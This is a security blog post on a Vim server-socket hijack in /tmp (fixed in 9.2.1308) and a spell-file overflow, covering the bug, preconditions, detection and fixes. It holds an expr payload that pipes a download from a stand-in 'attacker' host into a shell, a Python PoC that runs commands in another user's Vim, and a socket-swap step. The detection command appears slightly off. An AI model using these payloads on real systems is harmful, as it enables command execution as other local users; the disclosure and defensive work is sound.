---
title: "The Socket Nobody Owns: Hijacking Vim's Server Socket in /tmp (Vim < 9.2.1308)"
source: https://garrettstimpson.ca/posts/2026/11/09/vim-socketserver-tmp-dir-hijack/
source_host: garrettstimpson.ca
clip_date: 2026-11-09T20:22:33+08:00
trace_id: 0fb53ec8-f001-470e-b84a-8b2b75ab94c0
content_hash: 431b4d19626defbf0af29556402b619fbeed30ec5ccd67a1ca24b58dfb83155f
status: synced
tags: []
series: null
feed_source: Garrett Stimpson
ai_summary: null
ai_summary_style: null
images_status:
  total: 0
  succeeded: 0
  failed_urls: []
notion_page_id: 41375244-d011-8158-b0db-ee97058d9226
ioc:
  cves: []
  cwes:
    - CWE-276
    - CWE-283
  hashes: []
  domains: []
  tools: []
  techniques: []
---

Two Vim advisories landed on oss-security on November 8, 2026 and almost nobody has written about either. One is a heap overflow in the spell file reader that a modeline can trigger. The other is the one I want to talk about: the socketserver backend of the clientserver feature puts its control socket in `/tmp/vim-<uid>` without ever checking who owns that directory. If another user got there first, they own your editor.

No CVE has been assigned yet. The advisory lists CWE-283 (Unverified Ownership) and CWE-276 (Incorrect Default Permissions). Fixed in Vim 9.2.1308.

## What socketserver is

Vim has had a client/server mode for decades: one Vim runs as a server with `--servername`, other instances send it expressions or keystrokes over a Unix domain socket. The modern backend is `+socketserver`. The server listens on a socket path like `/tmp/vim-1000/vim-server-NAME`, and any client that can connect to that socket can send it messages.

Two message types matter:

-   `expr` - the server evaluates the expression with `eval_client_expr_to_string()`
-   `keystrokes` - the keystrokes are inserted into the server’s input buffer

There is no authentication on the socket. The entire security model is “only the right user can reach the socket.” And that model is enforced by directory permissions that Vim never verifies.

## The bug

`socketserver_get_path()` creates the socket directory:

```c
if (vim_mkdir(buf, 0700) == -1 && errno != EEXIST)
    continue;
```

Read that again. If the directory already exists, `mkdir` fails with `EEXIST`, the error is swallowed, and Vim proceeds to use the existing directory as-is. No `stat()`. No ownership check. No mode check. Classic TOCTOU-by-design: the check and the use are separated by an `EEXIST` that means “someone else may have made this.”

The directory path is `$XDG_RUNTIME_DIR/vim` or, when that is unset (the common case for a plain login shell), `$TMPDIR/vim-<uid>`, which falls back to `/tmp/vim-<uid>`. `/tmp` is world-writable. Any local user can create `/tmp/vim-1000` before user 1000 ever starts a server Vim, and own it.

Then `channel_listen_unix()` binds the server socket inside that attacker-owned directory with permissions `0777 & ~umask`.

## Two ways in

**Path one: permissive umask, direct connect.** If the victim runs with a umask like `002` or `000` (common on some shared dev boxes, CI runners, and containers), the socket itself is writable by the attacker’s group or everyone. The attacker connects and sends `expr` messages. Vim evaluates them. `eval_client_expr_to_string()` is not a sandbox - a Vim expression can call `system()`, `job_start()`, write files, anything.

```
:expr system('curl http://attacker/x|sh')
```

That is arbitrary command execution in the context of whoever is running Vim.

**Path two: umask 022, socket swap.** With the common `022` umask the socket is `0755` -ish and a direct connect fails. But the attacker owns the *directory*. They can remove the victim’s socket file and replace it with their own listener at the same path. Now the attacker is the server: they impersonate Vim towards any client the victim starts, harvest whatever the client sends, and - the nastier direction - when the victim’s own client tools connect expecting their server, the attacker controls the conversation. The advisory frames this as impersonating the server towards clients; combined with `keystrokes` injection on the real server (which the attacker can still reach by racing the bind), you have both halves of a man-in-the-middle on your editor’s control channel.

## Why this works everywhere it works

The preconditions, straight from the advisory:

-   a Vim build with `+socketserver`, used as a server (`--servername`, or `+autoservername` which some distros enable)
-   attacker has a local account on the same system
-   the socket directory lands in a shared location like `/tmp` - `$XDG_RUNTIME_DIR` set (systemd user sessions set it to `/run/user/<uid>`) is not affected, because that directory is already user-private
-   for direct code execution, a umask that makes the socket reachable

So the sweet spot is exactly the environment people underestimate: multi-user servers, shared build hosts, containers with more than one UID, university shell machines. On those, “someone starts a named Vim session and leaves it running” is not exotic - it is how people use tmux and long-lived editor sessions. And a long-lived server Vim is a sitting target: the attacker pre-creates the directory once, waits, and connects whenever the victim starts the server.

It is also a *persistence* primitive. The attacker does not need to win a race at the moment of exploitation. They win the race days earlier by creating an empty directory, and the victim’s own editor walks into it.

## The spell file bug, briefly

The second advisory (Vim < 9.2.1309, severity low) is a heap buffer overflow in the `.spl` spell file reader. `SN_SAL` and `SN_SOFO` sections both store soundfolding data in `sl_sal`, but with different shapes: `salitem_T` entries for `SN_SAL`, an array of 256 `int *` for `SN_SOFO`. The reader accepted any number of either section, so a spell file with two `SN_SOFO` sections makes `free_sal_items()` free the second section’s data as if it were `salitem_T` entries - reading past the allocation. The kicker: a spell file can be loaded via a modeline, so *opening a file* is enough to trigger it. Low severity, but “open a text file, corrupt the heap” is a primitive worth knowing exists.

## PoC walkthrough (lab only)

This is a reconstruction from the advisory’s own description, for a lab box you own. Do not run this against machines you do not control.

Setup, as the victim (uid 1000):

```bash
# victim's environment: no XDG_RUNTIME_DIR in this shell, umask 002
vim --servername labserver
```

Setup, as the attacker (different uid):

```bash
# 1. pre-create the victim's socket directory (win the race early)
mkdir /tmp/vim-1000

# 2. wait for the victim to start a server vim, then find the socket
ls -la /tmp/vim-1000/

# 3. connect and send an expr message (permissive-umask path)
python3 - <<'EOF'
import socket
s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.connect("/tmp/vim-1000/<socket-name>")
# message framing per vim's channel protocol; expr message:
s.sendall(b'[2,"expr","system(\'id > /tmp/pwned\')"]')
print(s.recv(4096))
EOF
```

If `/tmp/pwned` now contains the victim’s `id` output, the expression ran as the victim. That is the whole bug: one missing ownership check turning a world-writable directory into a command channel.

For the `022` -umask variant, instead of connecting, swap the socket:

```bash
mv /tmp/vim-1000/vim-server-* /tmp/vim-1000/.real
# bind your own listener at the original path, impersonate the server
```

Detection is easier than prevention here: an unexpected `/tmp/vim-<uid>` directory owned by a *different* user than the number in its name is the smoking gun. Something like:

```bash
find /tmp -maxdepth 1 -name 'vim-*' ! -user +0 -printf '%u %m %p\n'
```

Any hit where the directory owner does not match the uid in the name is either an attack in progress or a leftover from one.

## The fix and the agent checklist

Fixed in Vim 9.2.1308 (commit `a448e0c6bc459d7dbeab581bcb76a0d`, GHSA-p99j-mfjp-r4cg). The spell file overflow is fixed in 9.2.1309. If you are below those, update; there is no workaround for the directory hijack short of stopping the victim from using `/tmp` (set `XDG_RUNTIME_DIR` in every login shell, or mount `/tmp` per-user with `tmpfs` + `fs.mode=0700` in namespace options).

For the agents running fleet hygiene, the check is short:

-   inventory: any host with Vim < 9.2.1308 and multi-user local access is in scope
-   confirm the build has `+socketserver` (`vim --version | grep socketserver`) - if not, the exposure is nil
-   hunt: scan `/tmp` for `vim-<uid>` directories whose owner does not match the uid; treat any mismatch as compromise, not clutter
-   contain: kill server Vims, remove attacker-owned directories, rotate whatever the editor could have touched (the victim user’s SSH keys, tokens, and shell history are in blast radius)
-   prevent: pin Vim >= 9.2.1309, and set `XDG_RUNTIME_DIR` for interactive sessions on shared hosts so the socket never lands in `/tmp` at all

## Why nobody is talking about it

The unglamorous truth: there is no CVE number yet, no CVSS score to anchor a headline, and “local attacker on a shared box” reads as low drama in a news cycle full of pre-auth RCE. But the pattern here is one of the oldest and most reliable in Unix security - trust an object in a shared namespace because you created it once - and it shipped in one of the most widely installed editors on earth, found by an AI-assisted internal audit and independently reported by two research groups. The advisory is a week old as I write this and the fix is out. That window, between “patched upstream” and “anyone bothered to look,” is exactly where the interesting bugs live.

*Analysis based on the public oss-security advisories from the Vim maintainer (Nov 8, 2026) and the upstream fix commits. The PoC sketch above is a reconstruction of the described attack for lab verification, not original exploit development.*
